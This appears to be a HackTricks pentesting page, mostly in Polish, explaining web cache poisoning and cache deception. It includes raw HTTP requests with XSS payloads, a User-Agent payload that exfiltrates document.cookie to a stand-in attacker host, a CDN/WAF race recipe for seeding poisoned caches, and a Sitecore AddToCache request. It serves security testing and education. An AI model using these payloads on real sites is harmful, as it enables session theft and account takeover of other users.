# Cache Poisoning and Cache Deception

{{#include ../../banners/hacktricks-training.md}}

## Różnica

> **Jaka jest różnica między web cache poisoning a web cache deception?**
>
> - In **web cache poisoning**, atakujący powoduje, że aplikacja zapisuje złośliwą treść w cache, a ta treść jest serwowana z cache innym użytkownikom aplikacji.
> - In **web cache deception**, atakujący powoduje, że aplikacja zapisuje w cache wrażliwe dane należące do innego użytkownika, a następnie atakujący pobiera te dane z cache.

## Cache Poisoning

Cache poisoning ma na celu manipulowanie pamięcią podręczną po stronie klienta, aby zmusić klientów do ładowania zasobów, które są nieoczekiwane, częściowe lub znajdują się pod kontrolą atakującego. Skala wpływu zależy od popularności dotkniętej strony, ponieważ skażona odpowiedź jest serwowana wyłącznie użytkownikom odwiedzającym stronę w okresie zanieczyszczenia cache.

Wykonanie ataku cache poisoning obejmuje kilka kroków:

1. **Identification of Unkeyed Inputs**: Są to parametry, które, chociaż nie są brane pod uwagę przy tworzeniu cache dla żądania, mogą zmieniać odpowiedź zwracaną przez serwer. Identyfikacja tych parametrów jest kluczowa, ponieważ można je wykorzystać do manipulacji cache.
2. **Exploitation of the Unkeyed Inputs**: Po zidentyfikowaniu parametrów niewchodzących w klucz cache, kolejnym krokiem jest ustalenie, jak można nadużyć tych parametrów, aby zmodyfikować odpowiedź serwera na korzyść atakującego.
3. **Ensuring the Poisoned Response is Cached**: Ostatnim krokiem jest upewnienie się, że zmanipulowana odpowiedź zostanie zapisana w cache. W ten sposób każdy użytkownik odwiedzający dotkniętą stronę w czasie, gdy cache jest skażony, otrzyma taką odpowiedź.

### Discovery: Check HTTP headers

Zazwyczaj, gdy odpowiedź została **zapisana w cache**, pojawi się **nagłówek to wskazujący**; możesz sprawdzić, na które nagłówki powinieneś zwracać uwagę w tym wpisie: [**HTTP Cache headers**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Discovery: Caching error codes

Jeśli podejrzewasz, że odpowiedź jest zapisywana w cache, możesz spróbować **wysłać żądania z nieprawidłowym nagłówkiem**, na co serwer powinien odpowiedzieć **kodem statusu 400**. Następnie spróbuj uzyskać dostęp do zasobu normalnie — jeśli **odpowiedź ma kod 400**, wiesz, że jest podatne (i możesz nawet przeprowadzić DoS).

You can find more options in:


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

Zwróć uwagę jednak, że **czasami tego typu kody statusu nie są zapisywane w cache**, więc ten test może być nierzetelny.

### Discovery: Identify and evaluate unkeyed inputs

Możesz użyć [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) to **brute-force parameters and headers** które mogą **zmieniać odpowiedź strony**. Na przykład strona może używać nagłówka `X-Forwarded-For` aby wskazać klientowi, żeby stamtąd załadował skrypt:
```html
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Wywołaj szkodliwą odpowiedź z back-endu

With the parameter/header identified check how it is being **sanitised** and **where** is it **getting reflected** or affecting the response from the header. Can you abuse it anyway (perform an XSS or load a JS code controlled by you? perform a DoS?...)

### Uzyskaj zapis odpowiedzi w cache

Gdy już **zidentyfikujesz** **page**, którą można wykorzystać, który **parameter**/**header** użyć i **jak** ją **abuse**'ować, musisz sprawić, by strona została zapisana w cache. W zależności od zasobu, który próbujesz umieścić w cache, może to zająć trochę czasu — może być konieczne powtarzanie prób przez kilka sekund.

The header **`X-Cache`** in the response could be very useful as it may have the value **`miss`** when the request wasn't cached and the value **`hit`** when it is cached.\
The header **`Cache-Control`** is also interesting to know if a resource is being cached and when will be the next time the resource will be cached again: `Cache-Control: public, max-age=1800`

Another interesting header is **`Vary`**. This header is often used to **indicate additional headers** that are treated as **part of the cache key** even if they are normally unkeyed. Therefore, if the user knows the `User-Agent` of the victim he is targeting, he can poison the cache for the users using that specific `User-Agent`.

One more header related to the cache is **`Age`**. It defines the times in seconds the object has been in the proxy cache.

When caching a request, be **careful with the headers you use** because some of them could be **used unexpectedly** as **part of the key** and the **victim will need to use that same header**. Always **test** a Cache Poisoning with **different browsers** to check if it's working.

## Przykłady wykorzystania

### Najprostszy przykład

A header like `X-Forwarded-For` is being reflected in the response unsanitized.\
You can send a basic XSS payload and poison the cache so everybody that accesses the page will be XSSed:
```html
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Zauważ, że to zatruje żądanie do `/en?region=uk`, a nie do `/en`_

### Cache poisoning to DoS


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

### Cache poisoning through CDNs

W **[this writeup](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)** wyjaśniono następujący prosty scenariusz:

- CDN będzie przechowywać w cache wszystko znajdujące się pod `/share/`
- CDN NIE dekoduje ani nie normalizuje `%2F..%2F`, dlatego może być użyty jako **path traversal do uzyskania dostępu do innych wrażliwych lokalizacji, które będą przechowywane w cache** jak `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`
- Serwer WWW ZDEKODUJE i znormalizuje `%2F..%2F`, i odpowie zasobem `/api/auth/session`, który **zawiera auth token**

### Using web cache poisoning to exploit cookie-handling vulnerabilities

Cookies mogą być również odzwierciedlane w odpowiedzi strony. Jeśli możesz to wykorzystać do wywołania XSS, na przykład, możesz być w stanie wykorzystać XSS w wielu klientach, które ładują złośliwą odpowiedź z cache.
```html
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Zwróć uwagę, że jeśli podatny cookie jest często używany przez użytkowników, zwykłe żądania będą czyścić cache.

### Generowanie rozbieżności przy użyciu separatorów, normalizacji i kropek <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Sprawdź:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Cache poisoning przy użyciu path traversal w celu kradzieży API key <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**Ten opis wyjaśnia**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html), jak było możliwe skraść OpenAI API key za pomocą URL-a takiego jak `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`, ponieważ wszystko pasujące do `/share/*` będzie cached bez normalizowania URL przez Cloudflare, co było wykonywane, gdy żądanie docierało do serwera WWW.

To jest też lepiej wyjaśnione w:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Używanie wielu nagłówków do wykorzystania web cache poisoning vulnerabilities <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Czasami będziesz musiał **exploitować kilka unkeyed inputs**, aby móc nadużyć cache. Na przykład możesz znaleźć **Open redirect**, jeśli ustawisz `X-Forwarded-Host` na domenę kontrolowaną przez siebie i `X-Forwarded-Scheme` na `http`. **Jeśli** **serwer** **przekierowuje** wszystkie żądania **HTTP** **na HTTPS** i używa nagłówka `X-Forwarded-Scheme` jako nazwy domeny dla przekierowania, możesz kontrolować, dokąd strona zostanie przekierowana.
```html
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Wykorzystywanie przy ograniczonym nagłówku `Vary`

Jeśli ustalisz, że nagłówek **`X-Host`** jest używany jako **nazwa domeny do ładowania zasobu JS**, ale nagłówek odpowiedzi **`Vary`** wskazuje **`User-Agent`**, musisz znaleźć sposób, aby exfiltrate User-Agent ofiary i poison the cache używając tego User-Agenta:
```html
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

Wyślij żądanie GET, umieszczając request zarówno w URL, jak i w body. Jeśli web server użyje wartości z body, a cache server zapisze w cache wartość z URL, każdy, kto odwiedzi ten URL, faktycznie użyje parametru z body. Jak vuln, który James Kettle znalazł na stronie Github:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
There is a Portswigger lab about this: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parameter Cloacking

Na przykład możliwe jest rozdzielanie **parameters** na serwerach ruby za pomocą znaku **`;`** zamiast **`&`**. To może być użyte do umieszczenia wartości niekluczowanych parameters wewnątrz kluczowanych i ich nadużycia.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling

Dowiedz się tutaj, jak wykonać [Cache Poisoning attacks by abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-poisoning).

### Automated testing for Web Cache Poisoning

The [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) może być użyty do automatycznego testowania pod kątem web cache poisoning. Wspiera wiele różnych technik i jest wysoko konfigurowalny.

Example usage: `wcvs -u example.com`

### Header-reflection XSS + CDN/WAF-assisted cache seeding (User-Agent, auto-cached .js)

Ten wzorzec z rzeczywistego świata łączy header-based reflection primitive z zachowaniem CDN/WAF, aby niezawodnie zatruć zbuforowany HTML serwowany innym użytkownikom:

- Główny HTML odzwierciedlał nieufny request header (np. `User-Agent`) do kontekstu wykonywalnego.
- CDN usuwał cache headers, ale istniał cache wewnętrzny/origin. CDN również auto-cache'ował żądania kończące się na statyczne rozszerzenia (np. `.js`), podczas gdy WAF stosował słabszą inspekcję treści dla GETs dotyczących statycznych assetów.
- Dziwactwa przepływu requestów pozwalały, aby żądanie do ścieżki `.js` wpłynęło na cache key/variant używany dla kolejnego głównego HTML, umożliwiając cross-user XSS przez header reflection.

Praktyczny przepis (zaobserwowany na popularnym CDN/WAF):

1) Z czystego IP (unikaj wcześniejszych obniżeń reputacji), ustaw złośliwy `User-Agent` przez przeglądarkę lub Burp Proxy Match & Replace.
2) W Burp Repeater przygotuj grupę dwóch requestów i użyj "Send group in parallel" (najlepiej w trybie single-packet):
- Pierwsze żądanie: GET zasób `.js` na tym samym originie wysyłając złośliwy `User-Agent`.
- Bezpośrednio po tym: GET głównej strony (`/`).
3) Wyścig routingu CDN/WAF plus auto-cached `.js` często seeduje zatruwaną zbuforowaną wariantę HTML, która potem jest serwowana innym odwiedzającym dzielącym te same warunki cache key (np. te same wymiary `Vary` jak `User-Agent`).

Example header payload (to exfiltrate non-HttpOnly cookies):
```
User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
```
Operational tips:

- Wiele CDN ukrywa nagłówki cache; poisoning może być widoczny tylko przy wielogodzinnych cyklach odświeżania. Używaj wielu punktów obserwacyjnych (różnych adresów IP) i stosuj throttle, aby uniknąć wyzwalaczy rate-limit lub problemów z reputacją.
- Użycie IP z własnej chmury CDN czasami poprawia spójność routingu.
- Jeśli obecna jest restrykcyjna CSP, wciąż to działa, jeśli refleksja wykonuje się w głównym kontekście HTML i CSP pozwala na inline execution lub jest obejście zależne od kontekstu.

Impact:

- If session cookies aren’t `HttpOnly`, zero-click ATO is possible by mass-exfiltrating `document.cookie` from all users who are served the poisoned HTML.

Defenses:

- Przestań odzwierciedlać request headers w HTML; jeśli to nieuniknione, ściśle context-encode. Zsynchronizuj polityki cache CDN i origin i unikaj wariacji w oparciu o niezaufane nagłówki.
- Upewnij się, że WAF stosuje inspekcję treści konsekwentnie do żądań `.js` i ścieżek statycznych.
- Ustaw `HttpOnly` (oraz `Secure`, `SameSite`) na session cookies.

### Sitecore pre‑auth HTML cache poisoning (unsafe XAML Ajax reflection)

Wzorzec specyficzny dla Sitecore umożliwia nieuwierzytelnione zapisy do HtmlCache poprzez nadużycie pre‑auth XAML handlerów i odbicia AjaxScriptManager. Kiedy osiągany jest handler `Sitecore.Shell.Xaml.WebControl`, dostępny jest `xmlcontrol:GlobalHeader` (pochodzący z `Sitecore.Web.UI.WebControl`) i dozwolone jest wykonanie następującego reflective call:
```
POST /-/xaml/Sitecore.Shell.Xaml.WebControl
Content-Type: application/x-www-form-urlencoded

__PARAMETERS=AddToCache("key","<html>…payload…</html>")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1
```
To zapisuje dowolny HTML pod wybranym przez atakującego cache key, umożliwiając precyzyjne poisoning, gdy cache keys są znane.

For full details (cache key construction, ItemService enumeration and a chained post‑auth deserialization RCE):

{{#ref}}
../../network-services-pentesting/pentesting-web/sitecore/README.md
{{#endref}}

## Przykłady podatności

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS przekazywał fragment URL bez jego usuwania i generował cache key używając wyłącznie host, path i query (ignorując fragment). W efekcie żądanie `/#/../?r=javascript:alert(1)` zostało wysłane do backendu jako `/#/../?r=javascript:alert(1)`, a cache key nie zawierał payloadu, tylko host, path i query.

### GitHub CP-DoS

Wysłanie nieprawidłowej wartości w nagłówku content-type powodowało zwrócenie zcache’owanej odpowiedzi 405. Cache key zawierał cookie, więc atak był możliwy jedynie przeciwko niezalogowanym użytkownikom.

### GitLab + GCP CP-DoS

GitLab używa GCP buckets do przechowywania statycznych treści. **GCP Buckets** obsługują nagłówek **`x-http-method-override`**. Dzięki temu możliwe było wysłanie nagłówka `x-http-method-override: HEAD` i popoisowanie cache, by zwracał pusty body odpowiedzi. Obsługiwana mogła być też metoda `PURGE`.

### Rack Middleware (Ruby on Rails)

W aplikacjach Ruby on Rails często używa się Rack middleware. Kod Rack pobiera wartość nagłówka `x-forwarded-scheme` i ustawia ją jako scheme żądania. Gdy wysłano `x-forwarded-scheme: http`, następowało przekierowanie 301 do tej samej lokalizacji, co potencjalnie mogło spowodować DoS dla tego zasobu. Dodatkowo aplikacja może respektować nagłówek `X-forwarded-host` i przekierować użytkowników na wskazany host. To zachowanie może prowadzić do ładowania plików JavaScript z serwera atakującego, stanowiąc zagrożenie.

### 403 and Storage Buckets

Cloudflare wcześniej cache’ował odpowiedzi 403. Próby dostępu do S3 lub Azure Storage Blobs z nieprawidłowymi nagłówkami Authorization zwracały 403, które były cachowane. Choć Cloudflare przestał cachować 403, to zachowanie może nadal występować w innych serwisach proxy.

### Injecting Keyed Parameters

Cache często uwzględniają konkretne GET parametry w cache key. Na przykład Fastly's Varnish cachował parametr `size`. Jednak jeśli wysłano zakodowaną wersję parametru (np. `siz%65`) z błędną wartością, cache key był budowany używając poprawnego `size`, podczas gdy backend przetwarzał wartość zakodowanego parametru. URL-encoding drugiego `size` powodował jego pominięcie przez cache, ale użycie przez backend. Przypisanie wartości 0 do tego parametru skutkowało cache’owalnym błędem 400 Bad Request.

### User Agent Rules

Niektórzy deweloperzy blokują żądania z user-agentami odpowiadającymi narzędziom o dużym ruchu, takim jak FFUF czy Nuclei, aby ograniczyć obciążenie serwera. Paradoksalnie, takie podejście może wprowadzać podatności, np. cache poisoning i DoS.

### Illegal Header Fields

[https://datatracker.ietf.org/doc/html/rfc7230](https://datatracker.ietf.org/doc/html/rfc7230) określa dozwolone znaki w nazwach nagłówków. Nagłówki zawierające znaki spoza zakresu **tchar** powinny w teorii skutkować 400 Bad Request. W praktyce serwery nie zawsze tego przestrzegają. Przykładowo Akamai przepuszcza nagłówki z nieprawidłowymi znakami i cache’uje każdy błąd 400, o ile nie ma nagłówka `cache-control`. Zidentyfikowano wykorzystywalny wzorzec, gdzie wysłanie nagłówka z nielegalnym znakiem, np. `\`, powodowało cache’owalny 400 Bad Request.

### Wyszukiwanie nowych nagłówków

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cache Deception

Celem Cache Deception jest sprawienie, by klienci ładowali zasoby, które zostaną zapisane w cache wraz z ich poufnymi informacjami.

Przede wszystkim zwróć uwagę, że **rozszerzenia** takie jak `.css`, `.js`, `.png` itd. są zwykle **skonfigurowane**, by być **zapisane** w **cache.** Dlatego jeśli odwiedzisz `www.example.com/profile.php/nonexistent.js`, cache prawdopodobnie zapisze odpowiedź, ponieważ widzi rozszerzenie `.js`. Jednak jeśli **aplikacja** odpowiada zawartością zawierającą **poufne** dane użytkownika przechowywane w _www.example.com/profile.php_, możesz **ukraść** te dane od innych użytkowników.

Inne rzeczy do przetestowania:

- _www.example.com/profile.php/.js_
- _www.example.com/profile.php/.css_
- _www.example.com/profile.php/test.js_
- _www.example.com/profile.php/../test.js_
- _www.example.com/profile.php/%2e%2e/test.js_
- _Use lesser known extensions such as_ `.avif`

Kolejny czytelny przykład znajduje się w tym write-upie: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
W przykładzie wyjaśniono, że jeśli załadujesz nieistniejącą stronę jak _http://www.example.com/home.php/non-existent.css_, to zawartość _http://www.example.com/home.php_ (**z poufnymi informacjami użytkownika**) zostanie zwrócona i serwer cache zapisze wynik.\
Następnie **atakujący** może odwiedzić _http://www.example.com/home.php/non-existent.css_ w swojej przeglądarce i zobaczyć **poufne informacje** użytkowników, którzy odwiedzili wcześniej.

Zwróć uwagę, że **cache proxy** powinien być **skonfigurowany**, by **cache’ować** pliki **na podstawie** **rozszerzenia** pliku (_.css_) a nie na podstawie content-type. W przykładzie _http://www.example.com/home.php/non-existent.css_ będzie miał content-type `text/html` zamiast `text/css`.

Dowiedz się, jak przeprowadzić [Cache Deceptions attacks abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-deception).

## Narzędzia automatyczne

- [**toxicache**](https://github.com/xhzeem/toxicache): Golang scanner to find web cache poisoning vulnerabilities in a list of URLs and test multiple injection techniques.

## References

- [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
- [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
- [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
- [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
- [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)
- [Burp Proxy Match & Replace](https://portswigger.net/burp/documentation/desktop/tools/proxy/match-and-replace)
- [watchTowr Labs – Sitecore XP cache poisoning → RCE](https://labs.watchtowr.com/cache-me-if-you-can-sitecore-experience-platform-cache-poisoning-to-rce/)


{{#include ../../banners/hacktricks-training.md}}
